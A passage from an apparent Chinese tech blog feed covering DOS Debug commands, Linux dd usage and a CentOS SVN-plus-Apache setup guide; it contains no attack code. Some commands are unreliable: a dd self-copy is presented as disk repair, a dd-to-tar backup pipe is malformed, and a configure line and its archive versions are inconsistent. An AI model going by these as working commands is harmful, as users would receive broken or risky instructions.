list 　　参数 　　range 　　指定要填充内存区域的起始和结束地址，或起始地址和长度。　list 　　指定要输入的数据。List 可以由十六进制数或引号包括起来的字符串组成。　　6.Debug:G（转向） 运行当前在内存中的程序。 　　g [=address] [breakpoints]　　参数 　　=address 　　指定当前在内存中要开始执行的程序地址。如果不指定 address，Windows 2000 将从 CS:IP 寄存器中的当前地址开始执行程序。 　　breakpoints 　　指定可以设置为 g 命令的部分的 1 到 10 个临时断点。　　7. *Debug:H（十六进制）对指定的两个参数执行十六进制运算。 　　h value1 value2 　　参数 　　value1 　　代表从 0 到 FFFFh 范围内的任何十六进制数字。 　　value2 　　代表从 0 到 FFFFh 范围内第二个十六进制数字　　8.Debug:I（输入） 从指定的端口读取并显示一个字节值。 　　i port 　　参数 　　port 　　按地址指定输入端口。地址可以是 16 位的值。　　9.Debug:L（加载） 将某个文件或特定磁盘扇区的内容加载到内存。 　　要从磁盘文件加载 BX:CX 寄存器中指定的字节数内容，请使用以下语法： 　　l [address] 　　要略过 Windows 2000 文件系统并直接加载特定的扇区，请使用以下语法： 　　l address drive start number 　　参数 　　address 　　指定要在其中加载文件或扇区内容的内存位置。如果不指定 address，Debug 将使用 CS 寄存器中的当前地址。 　　drive 　　指定包含读取指定扇区的磁盘的驱动器。该值是数值型：0 = A, 1 = B, 2 = C 等。 　　start 　　指定要加载其内容的第一个扇区的十六进制数。 　　number 　　指定要加载其内容的连续扇区的十六进制数。只有要加载特定扇区的内容而不是加载 debug 命令行或最近的 Debug n（名称）命令中指定的文件时，才能使用 drive、start 和 number 参数。　　10.Debug:M（移动） 将一个内存块中的内容复制到另一个内存块中。 　　m range address 　　参数 　　range 　　指定要复制内容的内存区域的起始和结束地址，或起始地址和长度。 　　address 　　指定要将 range 内容复制到该位置的起始地址。 　　11.Debug:N（名称） 指定 Debug l（加载）或 w（写入）命令的可执行文件的名称，或者指定正在调试的可执行文件的参数。 　　n [drive:][path] filename 　　要指定测试的可执行文件的参数，请使用以下语法： 　　n file-parameters 　　参数 　　如果在没有参数的情况下使用，则 n 命令清除当前规范。 　　[drive:][path] filename 　　指定要测试的可执行文件的位置和名称。 　　file-parameters 　　为正在测试的可执行文件指定参数和开关。　　12.Debug:O（输出）将字节值发送到输出端口。 　　o port byte-value 　　参数 　　port 　　通过地址指定输出端口。端口地址可以是 16 位值。 　　byte-value 　　指定要指向 port 的字节值。　　13.Debug:P（执行）执行循环、重复的字符串指令、软件中断或子例程；或通过任何其他指令跟踪。 　　p [= address] [number] 　　参数 　　=address 　　指定第一个要执行指令的位置。如果不指定地址，则默认地址是在 CS:IP 寄存器中指定的当前地址。 　　number 　　指定在将控制返回给 Debug 之前要执行的指令数。默认值为 1。　　14.Debug:Q（退出）停止 Debug 会话，不保存当前测试的文件。 　　当您键入 q 以后，控制返回到 Windows 2000 的命令提示符。 　　q 　　参数 　　该命令不带参数。注：是如果从CMD进入DEBUG，则才会有上面这张图，如果是从运行里直接进入DEBUG的话则没有上面这张图片15. *Debug:r（寄存器） 显示或改变一个或多个 CPU 寄存器的内容。 　　r [register-name] 　　参数 　　无 　　如果在没有参数的情况下使用，则 r 命令显示所有寄存器的内容以及寄存器存储区域中的标志。 　　register-name 　　指定要显示其内容的寄存器名。　　16.Debug:s（搜索） 在某个地址范围搜索一个或多个字节值的模式。 　　s range list 　　参数 　　range 　　指定要搜索范围的开始和结束地址。有关 range 参数有效值的信息，请单击“相关主题”列表中的 Debug。 　　list 　　指定一个或多个字节值的模式，或要搜索的字符串。用空格或逗号分隔每个字节值和下一个字节值。将字符串值包括在引号中。　　17. *Debug:T（跟踪） 执行一条指令，并显示所有注册的内容、所有标志的状态和所执行指令的解码形式。 　　t [=address] [number] 　　参数 　　=address 　　指定 Debug 启动跟踪指令的地址。如果省略 address 参数，跟踪将从程序的 CS:IP 寄存器所指定的地址开始。　　number 　　指定要跟踪的指令数。该值必须是十六进制数。默认值为 1。 　　 18. *Debug:U（反汇编）反汇编字节并显示相应的原语句，其中包括地址和字节值。反汇编代码看起来象已汇编文件的列表。 　　u [range] 　　参数 　　无 　　如果在没有参数的情况下使用，则 u 命令分解 20h 字节（默认值），从前面 u 命令所显示地址后的第一个地址开始。 　　range 　　指定要反汇编代码的起始地址和结束地址，或起始地址和长度。　　19.Debug:W（写入） 将文件或特定分区写入磁盘。 　　要将在 BX:CX 寄存器中指定字节数的内容写入磁盘文件，请使用以下语法： 　　w [address] 　　要略过 Windows 2000 文件系统并直接写入特定的扇区，请使用以下语法： 　　w address drive start number 　　参数 　　address 　　指定要写到磁盘文件的文件或部分文件的起始内存地址。如果不指定 address，Debug 程序将从 CS:100 开始。　　drive 　　指定包含目标盘的驱动器。该值是数值型：0 = A, 1 = B, 2 = C,等等。 　　start 　　指定要写入第一个扇区的十六进制数。 　　number 　　指定要写入的扇区数。 　　20.Debug:XA（分配扩展内存） 分配扩展内存的指定页面数。 　　要使用扩展内存，必须安装符合 4.0 版的 Lotus/Intel/Microsoft 扩展内存规范 (LIM EMS) 的扩展内存设备驱动程序。 　　xa [count] 　　参数 　　count 　　指定要分配的扩展内存的 16KB 页数。 　　21.Debug:XD（取消分配扩展内存） 释放指向扩展内存的句柄。 　　要使用扩展内存，必须安装符合 4.0 版的 Lotus/Intel/Microsoft 扩展内存规范 (LIM EMS) 的扩展内存设备驱动程序。 　　xd [handle] 　　参数 　　handle 　　指定要释放的句柄。　　 22.Debug:XM（映射扩展内存页） 将属于指定句柄的扩展内存逻辑页映射到扩展内存的物理页。 　　要使用扩展内存，必须安装符合 4.0 版的 Lotus/Intel/Microsoft 扩展内存规范 (LIM EMS) 的扩展内存设备驱动程序。 　　xm [lpage] [ppage] [handle] 　　参数 　　lpage 　　指定要映射到物理页 ppage 的扩展内存的逻辑页面号。 　　ppage 　　指定将 lpage 映射到的物理页面号。 　　handle 　　指定句柄。　　 23.Debug:XS（显示扩展内存状态）显示有关扩展内存状态的信息。 　　要使用扩展内存，必须安装符合 4.0 版的 Lotus/Intel/Microsoft 扩展内存规范 (LIM EMS) 的扩展内存设备驱动程序。 　　xs 　　参数 　　该命令不带参数。 常用:    r  显示/修改 寄存器    d  段地址:偏移地址 - 偏移地址    u  将后续的字节翻译成汇编指令， 查看汇编翻译    a    段地址:偏移地址   写入执行汇编指令    e    段地址:偏移地址     e 1000:0 &quot;abcdef&quot;                e 1000:0 01.31  02.32 03.33                d  查看   显示为123         --- acsii    t    执行当前寄存器内汇编指令 cs:ip</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Asm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>dd常用参数</title>
      <link href="/2018/05/13/commands/dd/"/>
      <url>/2018/05/13/commands/dd/</url>
      
        <content type="html"><![CDATA[<p>Linux dd命令用于读取、转换并输出数据。</p><p>dd可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。</p><p><strong>/dev/null和/dev/zero的区别</strong><br>/dev/null，外号叫无底洞，你可以向它输出任何数据，它通吃，并且不会撑着！<br>/dev/zero,是一个输入设备，你可你用它来初始化文件。</p><p><strong>磁盘长时间放置:</strong> 容易造成磁盘头损坏。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/sda  of=/dev/sda</span><br></pre></td></tr></table></figure><p>来进行无损修复;</p><p>备份sda数据,并利用tar工具打包,保存到指定路径:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/sda  | tar -czvf  &gt; ~/sda.tar.gz</span><br></pre></td></tr></table></figure></p><p>创建1G文件<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/zero of=test bs=<span class="number">1</span>M count=<span class="number">1024</span></span><br></pre></td></tr></table></figure></p><p><br><br><a id="more"></a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">Usage: dd [OPERAND]...</span><br><span class="line">  or:  dd OPTION</span><br><span class="line">Copy a file, converting and formatting according to the operands.</span><br><span class="line"></span><br><span class="line">  bs=BYTES        read and write up to BYTES bytes at a time</span><br><span class="line">  cbs=BYTES       convert BYTES bytes at a time</span><br><span class="line">  conv=CONVS      convert the file as per the comma separated symbol list</span><br><span class="line">  count=N         copy only N input blocks</span><br><span class="line">  ibs=BYTES       read up to BYTES bytes at a time (default: <span class="number">512</span>)</span><br><span class="line">  <span class="keyword">if</span>=FILE         read from FILE instead of stdin</span><br><span class="line">  iflag=FLAGS     read as per the comma separated symbol list</span><br><span class="line">  obs=BYTES       write BYTES bytes at a time (default: <span class="number">512</span>)</span><br><span class="line">  of=FILE         write to FILE instead of stdout</span><br><span class="line">  oflag=FLAGS     write as per the comma separated symbol list</span><br><span class="line">  seek=N          skip N obs-sized blocks at start of output</span><br><span class="line">  skip=N          skip N ibs-sized blocks at start of input</span><br><span class="line">  status=LEVEL    The LEVEL of information to print to stderr;</span><br><span class="line">                  <span class="string">'none'</span> suppresses everything but error messages,</span><br><span class="line">                  <span class="string">'noxfer'</span> suppresses the final transfer statistics,</span><br><span class="line">                  <span class="string">'progress'</span> shows periodic transfer statistics</span><br><span class="line"></span><br><span class="line">N and BYTES may be followed by the following multiplicative suffixes:</span><br><span class="line">c =<span class="number">1</span>, w =<span class="number">2</span>, b =<span class="number">512</span>, kB =<span class="number">1000</span>, K =<span class="number">1024</span>, MB =<span class="number">1000</span>*<span class="number">1000</span>, M =<span class="number">1024</span>*<span class="number">1024</span>, xM =M</span><br><span class="line">GB =<span class="number">1000</span>*<span class="number">1000</span>*<span class="number">1000</span>, G =<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">1024</span>, and so on <span class="keyword">for</span> T, P, E, Z, Y.</span><br><span class="line"></span><br><span class="line">Each CONV symbol may be:</span><br><span class="line"></span><br><span class="line">  ascii     from EBCDIC to ASCII</span><br><span class="line">  ebcdic    from ASCII to EBCDIC</span><br><span class="line">  ibm       from ASCII to alternate EBCDIC</span><br><span class="line">  block     pad newline-terminated records with spaces to cbs-size</span><br><span class="line">  unblock   replace trailing spaces <span class="keyword">in</span> cbs-size records with newline</span><br><span class="line">  lcase     change upper case to lower case</span><br><span class="line">  ucase     change lower case to upper case</span><br><span class="line">  sparse    <span class="keyword">try</span> to seek rather than write the output <span class="keyword">for</span> NUL input blocks</span><br><span class="line">  swab      swap every pair of input bytes</span><br><span class="line">  sync      pad every input block with NULs to ibs-size; when used</span><br><span class="line">            with block or unblock, pad with spaces rather than NULs</span><br><span class="line">  excl      fail <span class="keyword">if</span> the output file already exists</span><br><span class="line">  nocreat   <span class="keyword">do</span> not create the output file</span><br><span class="line">  notrunc   <span class="keyword">do</span> not truncate the output file</span><br><span class="line">  noerror   <span class="keyword">continue</span> after read errors</span><br><span class="line">  fdatasync  physically write output file <span class="keyword">data</span> before finishing</span><br><span class="line">  fsync     likewise, but also write metadata</span><br><span class="line"></span><br><span class="line">Each FLAG symbol may be:</span><br><span class="line"></span><br><span class="line">  append    append mode (makes sense only <span class="keyword">for</span> output; conv=notrunc suggested)</span><br><span class="line">  direct    use direct I/O <span class="keyword">for</span> <span class="keyword">data</span></span><br><span class="line">  directory  fail unless a directory</span><br><span class="line">  dsync     use synchronized I/O <span class="keyword">for</span> <span class="keyword">data</span></span><br><span class="line">  sync      likewise, but also <span class="keyword">for</span> metadata</span><br><span class="line">  fullblock  accumulate full blocks of input (iflag only)</span><br><span class="line">  nonblock  use non-blocking I/O</span><br><span class="line">  noatime   <span class="keyword">do</span> not update access time</span><br><span class="line">  nocache   discard cached <span class="keyword">data</span></span><br><span class="line">  noctty    <span class="keyword">do</span> not assign controlling terminal from file</span><br><span class="line">  nofollow  <span class="keyword">do</span> not follow symlinks</span><br><span class="line">  count_bytes  treat <span class="string">'count=N'</span> as a byte count (iflag only)</span><br><span class="line">  skip_bytes  treat <span class="string">'skip=N'</span> as a byte count (iflag only)</span><br><span class="line">  seek_bytes  treat <span class="string">'seek=N'</span> as a byte count (oflag only)</span><br><span class="line"></span><br><span class="line">Sending a USR1 signal to a running <span class="string">'dd'</span> <span class="keyword">process</span> makes it</span><br><span class="line">print I/O statistics to standard error and then resume copying.</span><br><span class="line"></span><br><span class="line">  $ dd <span class="keyword">if</span>=/dev/zero of=/dev/null&amp; pid=$!</span><br><span class="line">  $ kill -USR1 <span class="variable">$pid</span>; sleep <span class="number">1</span>; kill <span class="variable">$pid</span></span><br><span class="line">  <span class="number">18335302</span>+<span class="number">0</span> records <span class="keyword">in</span></span><br><span class="line">  <span class="number">18335302</span>+<span class="number">0</span> records out</span><br><span class="line">  <span class="number">9387674624</span> bytes (<span class="number">9.4</span> GB) copied, <span class="number">34.6279</span> seconds, <span class="number">271</span> MB/s</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CentOS6.9  apached + svn</title>
      <link href="/2018/05/03/yunwei/CentOS6-9-apached-svn/"/>
      <url>/2018/05/03/yunwei/CentOS6-9-apached-svn/</url>
      
        <content type="html"><![CDATA[<p>【环境】Centos6.4 X86_64 minimum，iptables,selinux已关闭，所需软件包采取yum安装方式</p><p>【SVN客户端软件】TortoiseSVN</p><a id="more"></a><p><br></p><h3 id="不得不说的svn客户端的4种访问方式"><a href="#不得不说的svn客户端的4种访问方式" class="headerlink" title="不得不说的svn客户端的4种访问方式"></a>不得不说的svn客户端的4种访问方式</h3><p>​    先说说apache+svn，安装subversion包之后能用客户端访问了，但是不能从网页访问，于是考虑到集成apache和svn，提供更亲和的网页访问方式，但是配置完网页访问后傻眼了，一个简陋的版本库页面，只能浏览和下载不能上传，看来客户端访问还是主流</p><p>​    但是转念一想客户端也有版本库浏览器，同时还能上传下载，那要apache+svn干什么，直到我看到同事误把我写的服务器使用说明文档里的网页访问地址<a href="http://serverIP/svn/test粘贴到TortoiseSVN客户端的url里，居然也访问成功了，我才意识到apache+svn和单独的subversion是两种完全不同的访问方式" target="_blank" rel="noopener">http://serverIP/svn/test粘贴到TortoiseSVN客户端的url里，居然也访问成功了，我才意识到apache+svn和单独的subversion是两种完全不同的访问方式</a></p><p>​    原来以为apache+svn必须在subversion启动的条件下同时启动apache，并且保持subversion和apache配置完全一致才行，弄明白了之后才发现完全不是这么回事</p><p>​    实际上apache+svn是通过http协议80端口访问版本库，subversion是通过svn协议的3690端口访问版本库，这两种方式互不干涉，可以只启动80，不启动3690，也可以只启3690，不启80，还可以同时启动80和3690，甚至这两种方式的版本库根目录都可以不同的，用户名和密码也可以不同，apache+svn用的是htpasswd的用户名和密码，subversion用的是svnserve.conf指定的passwd文件里的用户名和密码，说白了apache+svn和单独的svn服务是两种完全不同svn服务类型</p><p>OK，做个总结：</p><p>实际上TortoiseSVN支持总共4种访问方式</p><ul><li><p>svn也就是独立的subversion服务，通过3690端口访问</p></li><li><p>http也就是apache+svn，通过80端口访问</p></li><li><p>https也就是apache+svn+ssl，通过443端口访问</p></li><li><p>svn+ssh也就是ssh+svn，这种稍微特殊，借用ssh隧道访问svn版本库，通过22端口访问，本文不涉及这种访问方式，有兴趣的话大家可以自己去查相关资料</p></li></ul><p>​    【注】windows有个visualsvn好像是直接集成的apache和svn，不知道visualsvn是否有网页上传功能呢。因为一般在linux上部署svn性能更好，安全稳定性更高，所以就没研究windows的svn，大家有兴趣的话可以自己安装个visualsvn试试</p><p><br></p><h3 id="配置SVN服务"><a href="#配置SVN服务" class="headerlink" title="配置SVN服务"></a>配置SVN服务</h3><h4 id="安装svn"><a href="#安装svn" class="headerlink" title="安装svn"></a>安装svn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install subversion</span><br></pre></td></tr></table></figure><h4 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -pv /svn/svnrepos ##建立版本库路径</span><br><span class="line">svnadmin create /svn/svnrepos   ##建立svnrepos svn库</span><br></pre></td></tr></table></figure><h4 id="目录-以及文件配置"><a href="#目录-以及文件配置" class="headerlink" title="目录 以及文件配置"></a>目录 以及文件配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@svn svnrepos]# tree -L 2</span><br><span class="line">.</span><br><span class="line">├── conf</span><br><span class="line">│   ├── passwd</span><br><span class="line">│   └── svnserve.conf</span><br><span class="line">├── dav</span><br><span class="line">│   └── activities.d</span><br><span class="line">├── db</span><br><span class="line">│   ├── current</span><br><span class="line">│   ├── format</span><br><span class="line">│   ├── fsfs.conf</span><br><span class="line">│   ├── fs-type</span><br><span class="line">│   ├── min-unpacked-rev</span><br><span class="line">│   ├── rep-cache.db</span><br><span class="line">│   ├── revprops</span><br><span class="line">│   ├── revs</span><br><span class="line">│   ├── transactions</span><br><span class="line">│   ├── txn-current</span><br><span class="line">│   ├── txn-current-lock</span><br><span class="line">│   ├── txn-protorevs</span><br><span class="line">│   ├── uuid</span><br><span class="line">│   └── write-lock</span><br><span class="line">├── format</span><br><span class="line">├── hooks</span><br><span class="line">│   ├── post-commit.tmpl</span><br><span class="line">│   ├── post-lock.tmpl</span><br><span class="line">│   ├── post-revprop-change.tmpl</span><br><span class="line">│   ├── post-unlock.tmpl</span><br><span class="line">│   ├── pre-commit.tmpl</span><br><span class="line">│   ├── pre-lock.tmpl</span><br><span class="line">│   ├── pre-revprop-change.tmpl</span><br><span class="line">│   ├── pre-unlock.tmpl</span><br><span class="line">│   └── start-commit.tmpl</span><br><span class="line">├── locks</span><br><span class="line">│   ├── db.lock</span><br><span class="line">│   └── db-logs.lock</span><br><span class="line">└── README.txt</span><br></pre></td></tr></table></figure><ol><li><p><code>svnserve.conf</code>配置项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[general]</span><br><span class="line">anon-access = none     #匿名用户无任何权限，如果想匿名用户可读，设置为read即可，默认read</span><br><span class="line">auth-access = write    #认证通过的用户可读可写</span><br><span class="line">password-db = /svn/svnrepos/etc/passwd    #用户名密码文件存放位置</span><br><span class="line">authz-db = /svn/svnrepos/etc/authz        #库权限配置文件存放位置</span><br><span class="line">realm = Unimation           #认证域名，相同认证域名的库的密码缓存可以在多个版本库之间共享</span><br></pre></td></tr></table></figure><p>【注】默认每个库都有一个<code>svnserve.conf</code>, 如果所有库共用一个<code>svnserve.conf</code>，可以在启动svn服务的时候指定添加<code>--config-file=filename</code>, svn服务启动的时候将不会再去读取默认配置文件，而会读取指定<code>svnserve.conf</code></p></li><li><p><code>passwd</code> 配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[users]</span><br><span class="line">harry = harryssecret         #定义库的用户和密码，格式为username = passwd</span><br><span class="line">sally = sallyssecret</span><br><span class="line">tom = tomssecret</span><br></pre></td></tr></table></figure></li><li><p><code>authz</code>配置项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[groups]                     #定义组和成员</span><br><span class="line">devteam = harry,sally        #格式为groupname = member1,member2</span><br><span class="line"></span><br><span class="line">[svnrepos:/]                    #定义test1库根目录的访问权限</span><br><span class="line">* = r                        #所有用户可读</span><br><span class="line">@devteam = rw                #开发组成员读写，注意组名前面要加@</span><br><span class="line">[svnrepos:/tomproject]          #定义test1下tomproject文件夹的权限</span><br><span class="line">tom = rw                     #tom读写</span><br></pre></td></tr></table></figure></li><li><p>启停svn服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svnserve -d -r /svn/svnrepos</span><br><span class="line">#    -d               以守护进程的方式运行svn服务</span><br><span class="line">#    -r               指定版本库根目录</span><br><span class="line">#    --listen-port    指定监听端口，默认端口3690</span><br></pre></td></tr></table></figure></li><li><p>此时即可通过 <a href="">svn://ip/svn/svnrepos</a>访问</p></li></ol><p>【注】同时运行多个库是和svn服务启动的时候的版本库根目录(-r 参数)有直接关系的，在版本库目录底下建多个库，启动的时候就可以把这些库一并启动起来，登陆时只需要指定不同的库名即可。</p><h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><p>删除整库是没有<code>svnadmin remove</code>这种命令， 直接<code>rm -rf</code>删除整个库文件夹即可.</p><p><br></p><h3 id="配置apache-svn"><a href="#配置apache-svn" class="headerlink" title="配置apache + svn"></a>配置apache + svn</h3><h4 id="准备相关库以及程序包"><a href="#准备相关库以及程序包" class="headerlink" title="准备相关库以及程序包"></a>准备相关库以及程序包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install httpd httpd-devel mod_dav_svn subversion mod_ssl</span><br><span class="line">yum install openssl-devel</span><br></pre></td></tr></table></figure><p><a href="https://pan.baidu.com/s/10dkIOl4WkrBppWTLbAIwBA" target="_blank" rel="noopener">apr-1.6.3.tar.gz</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#tar –zvxf apr-1.4.2.tar.gz</span><br><span class="line">#cd apr-1.4.2</span><br><span class="line">#./configure   安装不指定路径时 默认安装到/usr/local/apr</span><br><span class="line">#make</span><br><span class="line">#make install</span><br></pre></td></tr></table></figure><p><a href="https://pan.baidu.com/s/1xQW-1CRWyXZSDcAOpMJ01A" target="_blank" rel="noopener">apr-util-1.6.1.tar.gz</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#tar –zxvf apr-util-1.3.10.tar.gz</span><br><span class="line">#cd apr-util-1.3.10</span><br><span class="line">#./configure --with-apr=/usr/local/apr</span><br><span class="line">#make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p><a href="https://pan.baidu.com/s/1zV-T2qOCoTsrY76W3Cve_A" target="_blank" rel="noopener">httpd-2.4.33.tar.bz2</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#tar zxvf httpd-2.2.22.tar.gz</span><br><span class="line">#cd httpd-2.2.22</span><br><span class="line">#./configure --prefix=/usr/local/apache --with-apr=/usr/local/apr/bin/apr-1-config  --with-apr-util=/usr/local/apr/bin/apu-1-config --enable-modules=so --enable-dav --enable-maintainer-mode--enable-rewrite</span><br><span class="line">#make</span><br><span class="line">#make install</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">报错:</span><br><span class="line">  mod_so can not be built as a shared DSO</span><br></pre></td></tr></table></figure><p><strong>使用–enable-modules=all即可，编译安装成功。如：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/apache --with-apr=/usr/local/apr/bin/apr-1-config  --with-apr-util=/usr/local/apr/bin/apu-1-config --enable-modules=so --enable-dav --enable-maintainer-mode--enable-rewrite --enable-modules=all</span><br></pre></td></tr></table></figure><p>####apached 依赖库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apachectl -t -D DUMP_MODULES|grep svn       #查看apache是否已经加载了dav_svn_module和authz_svn_module</span><br><span class="line"> </span><br><span class="line">一般yum安装的apache模块都会在启动时自动加载，如果尚未加载，在http.conf文件中添加如下内容后重启httpd服务即可</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">sed -i &apos;/Options Indexes/s/Indexes/-Indexes/&apos; /etc/httpd/conf/httpd.conf</span><br><span class="line">#其中&quot;-&quot;表示不允许列目录</span><br></pre></td></tr></table></figure><h4 id="httpd-conf"><a href="#httpd-conf" class="headerlink" title="httpd.conf"></a><code>httpd.conf</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#vim /etc/httpd/conf/httpd.conf</span><br><span class="line">LoadModule dav_svn_module modules/mod_dav_svn.so</span><br><span class="line">LoadModule authz_svn_module modules/mod_authz_svn.so</span><br><span class="line"> </span><br><span class="line">此外，鉴于svn需要列出文件夹内容，建议把apache的默认列目录功能关闭，防止svn以外的目录被列出结构，提升安全性</span><br></pre></td></tr></table></figure><h4 id="httpd-conf-中-location配置"><a href="#httpd-conf-中-location配置" class="headerlink" title="httpd.conf 中 location配置"></a>httpd.conf 中 location配置</h4><p>配置一:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#vim /etc/httpd/conf/httpd.conf</span><br><span class="line">&lt;Location /svn&gt;</span><br><span class="line">    DAV svn                        #使用svn模块</span><br><span class="line">    SVNParentPath /svn/svnrepos    #svn版本库根目录</span><br><span class="line">    AuthType Basic                 #认证类型：基本身份认证</span><br><span class="line">    AuthName &quot;SVN&quot;                 #认证名称</span><br><span class="line">    AuthUserFile /svn/svnrepos/etc/.htpasswd        #指定用户名密码文件路径</span><br><span class="line">    AuthzSVNAccessFile /svn/svnrepos/etc/authz      #指定authz文件路径</span><br><span class="line">    Require valid-user             #有效用户可以访问</span><br><span class="line">&lt;/Location&gt;</span><br></pre></td></tr></table></figure><p>配置二:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">##存在异常;</span><br><span class="line">&lt;Location 